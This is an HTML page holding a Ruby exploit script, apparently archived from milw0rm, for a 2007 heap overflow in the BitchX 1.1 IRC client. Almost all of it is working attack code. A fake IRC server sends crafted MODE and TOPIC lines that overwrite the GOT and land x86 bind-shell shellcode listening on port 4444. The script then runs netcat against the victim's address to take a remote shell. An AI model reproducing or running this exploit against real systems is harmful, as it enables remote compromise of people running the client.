<html><head><title>BitchX 1.1 Final MODE Remote Heap Overflow Exploit (0-day)</title></head><pre>#!/usr/bin/env ruby
######################################################
# BitchX-1.1 Final MODE Heap Overflow [0-day]
# By bannedit
# Discovered May 16th 2007
# - Yet another overflow which can overwrite GOT
#
# I found this vuln after modifying ilja's ircfuzz
# code. Currently this exploit attempts to
# overwrite the GOT with the ret address to the
# shellcode.
#
# The actually vulnerability appears to be a stack
# overflow in p_mode. Due to input size restrictions
# the overflow can't occur on the stack because we can
# only overflow so much data. Luckily though we
# overwrite a structure containing pointers to heap
# data. This allows us to overwrite the GOT.
#
# Reliability of this exploit in its current stage is
# limited. There appears to be several factors which
# restrict the reliability.
#######################################################

require 'socket'

#the linux 2.6 target most effective atm
targets = { 'linux 2.6' =&gt; '0x81861c8', 'linux 2.6 Hardened (FC6)' =&gt;
'0x8154d70','freebsd' =&gt; '0x41414141' }

shellcode = #fork before binding a shell provides a clean exit
            &quot;\x6a\x02\x58\xcd\x80\x85\xc0\x74\x05\x6a\x01\x58\xcd\x80&quot;+

             #metasploit linux x86 shellcode bind tcp port 4444
            &quot;\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfc&quot;+
            &quot;\x98\xd8\xb8\x83\xeb\xfc\xe2\xf4\xcd\x43\x8b\xfb\xaf\xf2\xda\xd2&quot;+
            &quot;\x9a\xc0\x41\x31\x1d\x55\x58\x2e\xbf\xca\xbe\xd0\xed\xc4\xbe\xeb&quot;+
            &quot;\x75\x79\xb2\xde\xa4\xc8\x89\xee\x75\x79\x15\x38\x4c\xfe\x09\x5b&quot;+
            &quot;\x31\x18\x8a\xea\xaa\xdb\x51\x59\x4c\xfe\x15\x38\x6f\xf2\xda\xe1&quot;+
            &quot;\x4c\xa7\x15\x38\xb5\xe1\x21\x08\xf7\xca\xb0\x97\xd3\xeb\xb0\xd0&quot;+
            &quot;\xd3\xfa\xb1\xd6\x75\x7b\x8a\xeb\x75\x79\x15\x38&quot;
           

port = (ARGV[0] || 6667).to_i
sock = TCPServer.new('0.0.0.0', port)

ret = (targets['linux 2.6 Hardened (FC6)'].hex)

puts &quot;----------------------------------------------&quot;
puts &quot;- BitchX-1.1 Final Mode Heap Buffer Overflow -&quot;
puts &quot;- By bannedit                                -&quot;
puts &quot;----------------------------------------------&quot;


puts &quot;\n[-] listening for incoming clients...&quot;

while (client = sock.accept)
   ip = client.peeraddr

   buffer = client.gets
   puts &quot;[&lt;] #{buffer}&quot;
  
   hostname = ([ret].pack('V')) * 13
   nick = &quot;bannedit&quot;

   #Fake server reply to connection
   buffer = &quot;:#{nick} MODE #{nick} :+iw\r\n&quot;+
            &quot;:0 001 #{nick} :biznitch-1.0\r\n&quot;+
            &quot;:5 002 #{nick} :biznitch-1.0\r\n&quot;+
            &quot;:6 003 #{nick} :a\r\n&quot;+
            &quot;:aaa 004 #{nick} :a\r\n&quot;+
            &quot;:aaa 005 #{nick} :a\r\n&quot;+
            &quot;:aaa 251 #{nick} :a\r\n&quot;+
            &quot;:aaa 252 #{nick} :a\r\n&quot;+
            &quot;:aaa 253 #{nick} :a\r\n&quot;+
            &quot;:aaa 254 #{nick} :a\r\n&quot;+
            &quot;:aaa 255 #{nick} :a\r\n&quot;+
            &quot;:aaa 375 #{nick} :a\r\n&quot;+
            &quot;:aaa 372 #{nick} :a\r\n&quot;+
            &quot;:aaa 376 #{nick} :a\r\n&quot;
           
   join =   &quot;:aaa 302 #{nick} :#{nick}=+#{nick}@#{nick}\r\n&quot;+      
            &quot;:#{nick}!#{nick}@#{hostname * 4} JOIN :#hackers\r\n&quot;

   puts &quot;[&gt;] sending fake server response&quot;
   client.send(buffer, 0)
   sleep(2)
#   client.send(join, 0)

   topic =  &quot;:aaa TOPIC #hackers:&quot;
   ret = ret + 0x200
   topic&lt;&lt;  ([ret].pack('V')) * 100
   topic&lt;&lt; &quot;\r\n&quot;
   for i in 0..20
   client.send(topic, 0)
   end

   puts &quot;[&gt;] sending evil buffer&quot;
   evilbuf = &quot;:#{hostname}  MODE &quot;
   evilbuf&lt;&lt; &quot;#{nick} :aaa&quot;
   ret = ret + 0x200
   evilbuf&lt;&lt; ([ret].pack('V')) * 200
   evilbuf&lt;&lt; &quot;\x90&quot; * (1126 - shellcode.length)
   evilbuf&lt;&lt; shellcode
   evilbuf&lt;&lt; &quot;\x90&quot; * 40
   evilbuf&lt;&lt; &quot;\r\n&quot;
  
   for i in 0..5
      client.send(evilbuf, 0)
   end

sleep(10) #wait for the shellcode to do its thing...

puts &quot;[+] exploit completed if successful port 4444 should be open&quot;
puts &quot;[+] connecting to #{ip[3]} on port 4444 and dropping shell...\n\n&quot;

   fork {
           system(&quot;nc #{ip[3]} 4444&quot;)
           puts &quot;[+] exiting shell dropping back to listener&quot;
        }
end

# milw0rm.com [2007-08-27]</pre></html>